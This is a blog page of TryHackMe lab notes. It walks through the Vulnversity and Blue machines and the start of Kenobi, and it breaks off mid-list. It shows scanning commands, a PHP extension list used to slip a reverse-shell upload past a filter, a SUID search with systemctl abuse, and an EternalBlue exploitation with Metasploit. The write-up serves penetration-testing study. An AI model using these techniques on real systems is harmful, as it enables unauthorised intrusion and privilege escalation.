<!DOCTYPE html>
<html lang="en">
<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

  

  <title>6.Offensive Pentesting</title>

  
  <meta name="author" content="Qv1nTv5">
  

  <meta name="description" content="Notes of the TryHackMe&apos;s path Offensive Pentesting.">

  

  

  
  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
  

  

  

  

  


  
    
      
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">


    
      
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">


    
  

  
    
      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
    
      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
    
  

  

  
  
  

  

  
  <meta property="og:site_name" content="Home">
  <meta property="og:title" content="6.Offensive Pentesting">
  <meta property="og:description" content="Notes of the TryHackMe&apos;s path Offensive Pentesting.">

  

  
  <meta property="og:type" content="article">
  <meta property="og:article:author" content="Qv1nTv5">
  <meta property="og:article:published_time" content="2022-11-01T00:00:00-04:00">
  <meta property="og:url" content="http://localhost:4000/2022-11-01-6.OffensivePentesting/">
  <link rel="canonical" href="http://localhost:4000/2022-11-01-6.OffensivePentesting/">
  

  
  <meta name="twitter:card" content="summary">
  
  <meta name="twitter:site" content="@Qvintvs1">
  <meta name="twitter:creator" content="@Qvintvs1">

  <meta property="twitter:title" content="6.Offensive Pentesting">
  <meta property="twitter:description" content="Notes of the TryHackMe&apos;s path Offensive Pentesting.">

  

  


  

  

</head>


<body>

  


  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="main-navbar">
    <ul class="navbar-nav ml-auto">
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                  <a class="dropdown-item" href="/Cpage">C</a>
                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
            </div>
          </li>
        
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
                  <a class="dropdown-item" href="/THMpage">Thm</a>
                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
                  <a class="dropdown-item" href="/REDESpage">Net</a>
                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
            </div>
          </li>
        
        <li class="nav-item">
          <a class="nav-link" id="nav-search-link" href="#" title="Search">
            <span id="nav-search-icon" class="fa fa-search"></span>
            <span id="nav-search-text">Search</span>
          </a>
        </li></ul>
  </div>

  

  

</nav>



<div id="beautifuljekyll-search-overlay">

  <div id="nav-search-exit" title="Exit search">✕</div>
  <input type="text" id="nav-search-input" placeholder="Search">
  <ul id="search-results-container"></ul>
  
  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
  <script>
    var searchjson = '[ \
       \
        { \
          "title"    : "2. Constants and Literals in C.", \
          "category" : "C", \
          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
          "date"     : "December 10, 2024" \
        }, \
       \
        { \
          "title"    : "1. Basics of C", \
          "category" : "C", \
          "url"      : "/2024-12-02-1.BasicsOfC/", \
          "date"     : "December  2, 2024" \
        }, \
       \
        { \
          "title"    : "Gramáticas en Dharma", \
          "category" : "DHA", \
          "url"      : "/2024-09-24-Dharma_Tutorial/", \
          "date"     : "September 24, 2024" \
        }, \
       \
        { \
          "title"    : "Gramáticas en Dharma", \
          "category" : "fuzz", \
          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
          "date"     : "March 22, 2024" \
        }, \
       \
        { \
          "title"    : "Mi experiencia con el OSCP", \
          "category" : "pen", \
          "url"      : "/2023-11-19-PEN200_Experience/", \
          "date"     : "November 19, 2023" \
        }, \
       \
        { \
          "title"    : "Client Side", \
          "category" : "pen", \
          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
          "date"     : "November 17, 2023" \
        }, \
       \
        { \
          "title"    : "Deep Packet Tunneling", \
          "category" : "pen", \
          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
          "date"     : "November 16, 2023" \
        }, \
       \
        { \
          "title"    : "Report", \
          "category" : "pen", \
          "url"      : "/2023-11-15-15.Making_Reports/", \
          "date"     : "November 15, 2023" \
        }, \
       \
        { \
          "title"    : "Metasploit", \
          "category" : "pen", \
          "url"      : "/2023-11-14-14.Metasploit/", \
          "date"     : "November 14, 2023" \
        }, \
       \
        { \
          "title"    : "Password Attacks", \
          "category" : "pen", \
          "url"      : "/2023-11-13-13.Password_Attacks/", \
          "date"     : "November 13, 2023" \
        }, \
       \
        { \
          "title"    : "Active Directory Attacks", \
          "category" : "pen", \
          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
          "date"     : "November 12, 2023" \
        }, \
       \
        { \
          "title"    : "Port Forwarding", \
          "category" : "pen", \
          "url"      : "/2023-11-11-11.Port_Forwarding/", \
          "date"     : "November 11, 2023" \
        }, \
       \
        { \
          "title"    : "Privilege Escalation", \
          "category" : "pen", \
          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
          "date"     : "November 10, 2023" \
        }, \
       \
        { \
          "title"    : "File Transfers", \
          "category" : "pen", \
          "url"      : "/2023-11-09-9.File_Tranfers/", \
          "date"     : "November  9, 2023" \
        }, \
       \
        { \
          "title"    : "Buffer Overflows", \
          "category" : "pen", \
          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
          "date"     : "November  8, 2023" \
        }, \
       \
        { \
          "title"    : "Vulnerability Scanning.", \
          "category" : "pen", \
          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
          "date"     : "November  7, 2023" \
        }, \
       \
        { \
          "title"    : "Information Gathering", \
          "category" : "pen", \
          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
          "date"     : "November  6, 2023" \
        }, \
       \
        { \
          "title"    : "Windows", \
          "category" : "pen", \
          "url"      : "/2023-11-05-5.Windows/", \
          "date"     : "November  5, 2023" \
        }, \
       \
        { \
          "title"    : "Networking", \
          "category" : "pen", \
          "url"      : "/2023-11-04-4.Networking/", \
          "date"     : "November  4, 2023" \
        }, \
       \
        { \
          "title"    : "Scripting", \
          "category" : "pen", \
          "url"      : "/2023-11-03-3.Scripting/", \
          "date"     : "November  3, 2023" \
        }, \
       \
        { \
          "title"    : "Practical Tools", \
          "category" : "pen", \
          "url"      : "/2023-11-02-2.PracticalTools/", \
          "date"     : "November  2, 2023" \
        }, \
       \
        { \
          "title"    : "Linux", \
          "category" : "pen", \
          "url"      : "/2023-11-01-1.Linux/", \
          "date"     : "November  1, 2023" \
        }, \
       \
        { \
          "title"    : "Easy", \
          "category" : "hack", \
          "url"      : "/2022-12-01-Easy/", \
          "date"     : "December  1, 2022" \
        }, \
       \
        { \
          "title"    : "Git Basics", \
          "category" : "", \
          "url"      : "/2022-11-17-GitBasics/", \
          "date"     : "November 17, 2022" \
        }, \
       \
        { \
          "title"    : "Tier I", \
          "category" : "hack", \
          "url"      : "/2022-11-10-Tier_1/", \
          "date"     : "November 10, 2022" \
        }, \
       \
        { \
          "title"    : "Tier 0", \
          "category" : "hack", \
          "url"      : "/2022-11-09-Tier_0/", \
          "date"     : "November  9, 2022" \
        }, \
       \
        { \
          "title"    : "7.BufferOverflow.", \
          "category" : "thm", \
          "url"      : "/2022-11-02-7.BufferOverflow/", \
          "date"     : "November  2, 2022" \
        }, \
       \
        { \
          "title"    : "6.Offensive Pentesting", \
          "category" : "thm", \
          "url"      : "/2022-11-01-6.OffensivePentesting/", \
          "date"     : "November  1, 2022" \
        }, \
       \
        { \
          "title"    : "5.RedTeam", \
          "category" : "thm", \
          "url"      : "/2022-10-30-5.RedTeam/", \
          "date"     : "October 30, 2022" \
        }, \
       \
        { \
          "title"    : "4.Windows", \
          "category" : "thm", \
          "url"      : "/2022-10-22-4.Windows/", \
          "date"     : "October 22, 2022" \
        }, \
       \
        { \
          "title"    : "3.Junior Penetrationtester path", \
          "category" : "thm", \
          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
          "date"     : "September  2, 2022" \
        }, \
       \
        { \
          "title"    : "2.Complete Begginer path.", \
          "category" : "thm", \
          "url"      : "/2022-08-07-2.CompleteBegginer/", \
          "date"     : "August  7, 2022" \
        }, \
       \
        { \
          "title"    : "1.Pre-Security path.", \
          "category" : "thm", \
          "url"      : "/2022-07-11-1Pre-Security/", \
          "date"     : "July 11, 2022" \
        }, \
       \
        { \
          "title"    : "0.Scripting for pentesters.", \
          "category" : "thm", \
          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
          "date"     : "July 10, 2022" \
        }, \
       \
        { \
          "title"    : "Burp Certified Practitioner Practice Exam.", \
          "category" : "burp", \
          "url"      : "/2022-03-30-PracticeExam/", \
          "date"     : "March 30, 2022" \
        }, \
       \
        { \
          "title"    : "22. OAuth Authentication.", \
          "category" : "burp", \
          "url"      : "/2022-03-27-22.OAuth_authentication/", \
          "date"     : "March 27, 2022" \
        }, \
       \
        { \
          "title"    : "21. HTTP Request Smuggling.", \
          "category" : "burp", \
          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
          "date"     : "March 26, 2022" \
        }, \
       \
        { \
          "title"    : "20. HTTP Host Header Attacks.", \
          "category" : "burp", \
          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
          "date"     : "March 25, 2022" \
        }, \
       \
        { \
          "title"    : "19. Web Cache Poisoning.", \
          "category" : "burp", \
          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
          "date"     : "March 24, 2022" \
        }, \
       \
        { \
          "title"    : "18. Server-Side Template Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
          "date"     : "March 23, 2022" \
        }, \
       \
        { \
          "title"    : "17. Insecure Deserialization.", \
          "category" : "burp", \
          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
          "date"     : "March 22, 2022" \
        }, \
       \
        { \
          "title"    : "16. WebSockets.", \
          "category" : "burp", \
          "url"      : "/2022-03-21-16.WebSockets/", \
          "date"     : "March 21, 2022" \
        }, \
       \
        { \
          "title"    : "15.DOM-based XSS vulnerabilities.", \
          "category" : "burp", \
          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
          "date"     : "March 20, 2022" \
        }, \
       \
        { \
          "title"    : "14. Clickjacking.", \
          "category" : "burp", \
          "url"      : "/2022-03-19-14.Clickjacking/", \
          "date"     : "March 19, 2022" \
        }, \
       \
        { \
          "title"    : "13. Cross-Origin Resource Sharing.", \
          "category" : "burp", \
          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
          "date"     : "March 18, 2022" \
        }, \
       \
        { \
          "title"    : "12. Cross-Site Request Forgery.", \
          "category" : "burp", \
          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
          "date"     : "March 17, 2022" \
        }, \
       \
        { \
          "title"    : "11. Cross-Site Scripting.", \
          "category" : "burp", \
          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
          "date"     : "March 16, 2022" \
        }, \
       \
        { \
          "title"    : "10. XXE Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-15-10.XXE_injection/", \
          "date"     : "March 15, 2022" \
        }, \
       \
        { \
          "title"    : "9. Server-Side Request Forgery.", \
          "category" : "burp", \
          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
          "date"     : "March 14, 2022" \
        }, \
       \
        { \
          "title"    : "8. File Upload.", \
          "category" : "burp", \
          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
          "date"     : "March 13, 2022" \
        }, \
       \
        { \
          "title"    : "7. Access Control.", \
          "category" : "burp", \
          "url"      : "/2022-03-12-7.Access_control/", \
          "date"     : "March 12, 2022" \
        }, \
       \
        { \
          "title"    : "6. Information Disclosure.", \
          "category" : "burp", \
          "url"      : "/2022-03-11-6.Information_disclosure/", \
          "date"     : "March 11, 2022" \
        }, \
       \
        { \
          "title"    : "5. Bussiness Logic Vulnerabilities.", \
          "category" : "burp", \
          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
          "date"     : "March 10, 2022" \
        }, \
       \
        { \
          "title"    : "4. Command Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-09-4.Command_Injection/", \
          "date"     : "March  9, 2022" \
        }, \
       \
        { \
          "title"    : "3. Directory Traversal.", \
          "category" : "burp", \
          "url"      : "/2022-03-08-3.Directory_Traversal/", \
          "date"     : "March  8, 2022" \
        }, \
       \
        { \
          "title"    : "2. Authentication.", \
          "category" : "burp", \
          "url"      : "/2022-03-07-2.Authentication/", \
          "date"     : "March  7, 2022" \
        }, \
       \
        { \
          "title"    : "1. SQLInjection", \
          "category" : "burp", \
          "url"      : "/2022-03-06-1.SQLInjection/", \
          "date"     : "March  6, 2022" \
        }, \
       \
        { \
          "title"    : "Seguridad Perimetral", \
          "category" : "blueteam", \
          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
          "date"     : "February  9, 2022" \
        }, \
       \
        { \
          "title"    : "Hardening de sistemas", \
          "category" : "blueteam", \
          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
          "date"     : "February  9, 2022" \
        }, \
       \
        { \
          "title"    : "Bandit", \
          "category" : "otw", \
          "url"      : "/2022-02-08-Bandit/", \
          "date"     : "February  8, 2022" \
        }, \
       \
        { \
          "title"    : "Proxy", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Proxys/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Protocolos Relevantes", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Protocolos_Importantes/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Curso Básico Redes", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Precurso_Redes/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "IPs", \
          "category" : "redes", \
          "url"      : "/2022-02-07-IPs/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Movimientos Laterales", \
          "category" : "redteam", \
          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
          "date"     : "February  6, 2022" \
        }, \
       \
        { \
          "title"    : "Evasión de Defensas", \
          "category" : "redteam", \
          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
          "date"     : "February  5, 2022" \
        }, \
       \
        { \
          "title"    : "Escalada de privilegios", \
          "category" : "redteam", \
          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
          "date"     : "February  5, 2022" \
        }, \
       \
        { \
          "title"    : "Metasploit", \
          "category" : "redteam", \
          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
          "date"     : "February  4, 2022" \
        }, \
       \
        { \
          "title"    : "Ataques a aplicaciones Android", \
          "category" : "redteam", \
          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
          "date"     : "February  3, 2022" \
        }, \
       \
        { \
          "title"    : "Ataque a aplicaciones web.", \
          "category" : "redteam", \
          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
          "date"     : "February  2, 2022" \
        }, \
       \
        { \
          "title"    : "Ataques a Infraestructuras y Redes", \
          "category" : "redteam", \
          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
          "date"     : "February  1, 2022" \
        }, \
       \
        { \
          "title"    : "Análisis de Objetivos", \
          "category" : "redteam", \
          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
          "date"     : "January 28, 2022" \
        }, \
       \
       \
        { \
          "title"    : "Blueteam Basics", \
          "category" : "page", \
          "url"      : "/BLUETEAMBASICSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "PortSwigger BurpSuite Course", \
          "category" : "page", \
          "url"      : "/BURPSUITEpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "C programming subjects.", \
          "category" : "page", \
          "url"      : "/Cpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Dharma Fuzzer language", \
          "category" : "page", \
          "url"      : "/DHARMApage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Exploiting &amp; Reversing", \
          "category" : "page", \
          "url"      : "/EXPREVpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Fuzzing JavaScript Engine", \
          "category" : "page", \
          "url"      : "/Fuzzpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "HackTheBox", \
          "category" : "page", \
          "url"      : "/HackTheBoxpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "PEN200 notes", \
          "category" : "page", \
          "url"      : "/PEN200page/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Proyectos", \
          "category" : "page", \
          "url"      : "/PROJECTSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Networking Basics", \
          "category" : "page", \
          "url"      : "/REDESpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "RedTeam Basics", \
          "category" : "page", \
          "url"      : "/REDTEAMBASICSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Retired Machines", \
          "category" : "page", \
          "url"      : "/RetiredMachinespage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "TryHackMe", \
          "category" : "page", \
          "url"      : "/THMpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "About me", \
          "category" : "page", \
          "url"      : "/aboutme/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "THM", \
          "category" : "page", \
          "url"      : "/preOSCPpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Tag Index", \
          "category" : "page", \
          "url"      : "/tags/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page2/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page3/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page4/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page5/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page6/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page7/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page8/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page9/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page10/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page11/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page12/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page13/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page14/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page15/", \
          "date"     : "January 1, 1970" \
        } \
       \
    ]';
    searchjson = JSON.parse(searchjson);

    var sjs = SimpleJekyllSearch({
      searchInput: document.getElementById('nav-search-input'),
      resultsContainer: document.getElementById('search-results-container'),
      json: searchjson
    });
  </script>
</div>





  <!-- TODO this file has become a mess, refactor it -->







<header class="header-section ">

<div class="intro-header no-img">
  <div class="container-md">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
        <div class="post-heading">
          <h1>6.Offensive Pentesting</h1>
          
            
              <h2 class="post-subheading">Notes of the TryHackMe's path Offensive Pentesting.</h2>
            
          

          
            <span class="post-meta">Posted on November 1, 2022</span>
            
            
          
        </div>
      </div>
    </div>
  </div>
</div>
</header>





<div class=" container-md ">
  <div class="row">
    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">

      

      

      <article role="main" class="blog-post">
        <h2 id="0-índice">0. Índice.</h2>

<ul>
  <li>1 Getting Started.</li>
  <li>Vulnsversity.</li>
  <li>Blue.</li>
  <li>
    <p>Kenobi.</p>
  </li>
  <li>2 Advanced Explotation.</li>
  <li>Steel Mountain.</li>
  <li>Alfred.</li>
  <li>HackPark.</li>
  <li>Game Zone.</li>
  <li>Skynet</li>
  <li>Daily Bugle</li>
  <li>Overpass 2 - Hacked.</li>
  <li>Relevant.</li>
  <li>
    <p>Internal.</p>
  </li>
  <li>3 Buffer Overflow Explotation.</li>
  <li>Buffer Overflow Prep.</li>
  <li>Brainstorm.</li>
</ul>

<p><br /></p>

<h3 id="1-getting-started">1. Getting Started.</h3>
<h4 id="11-vulnversity">1.1. Vulnversity.</h4>

<p>We’re going to compromise a target machine with IP: 10.10.39.39.</p>

<p>First of all, we have to a reconaissance job with Nmap tool. Thus, we trigger a shell and enter the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">-A</span> &lt;VictimIP&gt;
</code></pre></div></div>

<p>With this command we espect to obtain a detailed information (-A) about all the open ports (-p-) on the machine at high speed (-T5).</p>

<p>Atending to the results of the scanning we can see among other things that that the server is running a web server on port 3333, that is a Linux (most likely Ubuntu) server and it have SMB servers on port 139 and 445 with a SSH port open:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007082112.png" text-align="center" />
</div>

<p>Thus, we are going to explore the web application in order to find something useful. In this case we are going to user <em>dirb</em> tool and the wordlist <em>common.txt</em>. Dirb is a web directory scanning tool that will provide us with a map of the web directories and sub directories that itfounds in base of a wordlists. We launch the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb http://10.10.39.39:3333
</code></pre></div></div>

<p>And we receibe the subsecuently result:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007083459.png" text-align="center" />
</div>

<p>As we can see, the web app have a “upload” functionality section in <em>internal</em>.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007084313.png" text-align="center" />
</div>

<p>So we can try to upload a webshell to gain RCE over the server and then perform a privilege escalation to gain full control over the machine.</p>

<p>In first place, we need to know in which language is the web server based (PHP, Python, Java, etc), there is not a standard way to obtain this information, and since there isn’t any clue on the web app, we will have to test differents extensions.</p>

<p>Multiples php scripts of webshell in this <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">link</a>
We have to configure the IP and port parameters and start a listener in out machine in that port.</p>

<p>In our first atempt to upload a php shell we get a block message:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007091354.png" text-align="center" />
</div>

<p>So we already know which program language we need to use, we only least to find a way to upload a php script in order to execute it. It happens there is more extensions that a php script would admit in order to be execute (.php, .php2, …, .phtml).</p>

<p>To discover which extension is valid, we catch a tool like burpsuite and capture the upload “shell.php” request to send it to the burp intruder:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007093155.png" text-align="center" />
</div>

<p>We can see that the name of the file is already on the request and it can be modified to try to sneak the file with another extensión. We use the burp Intruder to send in batery a set of requests with te extension changed, then we configure the lists of extensions to be used</p>

<pre><code class="language-default">php2
php3
php4
php5
phtml
</code></pre>

<p>and the block message to discart the responses that have been blocked</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007093653.png" text-align="center" />
</div>

<p>So we launch the attack and the results give that the .phtml extension is the correct:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007094115.png" text-align="center" />
</div>

<p>Thus, we go to “internals/uploads” and there we would find our script. Only least to click on it to execute it and active a shell in our previous set up listener:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007094507.png" text-align="center" />
</div>

<p>We lookup SUID files with the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ldb</span> <span class="o">{}</span> <span class="se">\</span>
</code></pre></div></div>

<p>And we get:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007102222.png" text-align="center" />
</div>

<p>To exploit that systemctl SUID file we go to GTFOBins and look for systemctl</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007102309.png" text-align="center" />
</div>

<p>We copy that code into a script changing the command to “cat /root/root.txt” to obtain the flag:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007102538.png" text-align="center" />
</div>

<p><br /></p>

<h4 id="12-blue">1.2. Blue.</h4>

<p>In this case we are going to attack a Windows machine. In first case, we do a port scanning with Nmap using the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">-A</span> &lt;IP&gt;
</code></pre></div></div>

<p>This command will use the Nmap tool to perfom a high speed scan (-T5) over all the ports (-p-) and then will display detailed information about the open ports founded.</p>

<p>The results show that there is several ports open, among them we found; SMB Servers, RDP, and multiple RPC ports:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007114601.png" text-align="center" />
</div>

<p>Furthermore, the command will run some nse scripts, there we can check that the SMB servers are running in a Windows 7 OS host among other things. So, we can try to test if the SMB server is vulnerable to the famous malware Eternalblue with the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>map <span class="nt">-T5</span> <span class="nt">-p445</span> <span class="nt">--script</span> smb-vuln-ms17-010 &lt;IP&gt;
</code></pre></div></div>

<p>Thus, the results indicate that the SMB server running on port 445 is in fact vulnerable to EternalBlue:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007115313.png" text-align="center" />
</div>

<p>Then, we open our C2 enviroment tool Metasploit and search the term “Eternalblue”, write up the missin parameters as RHOSTS and others and launch the exploit:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007120252.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007120308.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007120320.png" text-align="center" />
</div>

<p>Then, in order to perform a privilege escalation operation we execute de term ‘getsystem’:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007120641.png" text-align="center" />
</div>

<p>If the system don’t allow us to elevate privilege we can try to migrate the process to some other process runned by NT AUTHORITY\SYSTEM with the help of ‘ps’ and ‘migrate &lt;PID&gt;’ commands. Like this we already gain full control over the machine.</p>

<p><br /></p>

<h4 id="13-kenobi">1.3. Kenobi.</h4>

<p>In this case we stand against a Linux machine. We proceed to scan all the ports with Nmap tool:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">-A</span> &lt;IP&gt;
</code></pre></div></div>

<p>The results shown different things, the machine have a FTP, SSH, HTTP and both SMB servers listening in they default ports. Particulary interesting too is that the port 111 have arpcbind server that bind rpc defined by a number with other programs like nfs, mountd, etc.</p>

<ul>
  <li>
